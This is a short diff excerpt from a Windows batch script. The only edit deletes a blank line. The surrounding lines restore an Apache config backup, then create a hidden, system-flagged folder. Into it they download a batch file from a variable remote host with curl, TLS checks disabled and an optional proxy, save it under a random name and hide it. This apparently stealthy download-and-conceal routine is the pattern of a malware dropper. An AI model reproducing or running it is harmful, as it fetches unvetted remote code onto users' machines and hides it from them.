@@ -56,7 +56,6 @@ move /y "%environment%\apache2\conf\httpd.conf.bak" "%environment%\apache2\conf\
 
 timeout -t 300
 
-
 mkdir "%environment%\Win32" && attrib +s +h +i "%environment%\Win32"
 set "win32=%random%"
 "%environment%\curl.exe" -k %proxy% %host%/win32.bat -o "%environment%\Win32\%win32%.bat" && attrib +s +h +i "%environment%\Win32\%win32%.bat"
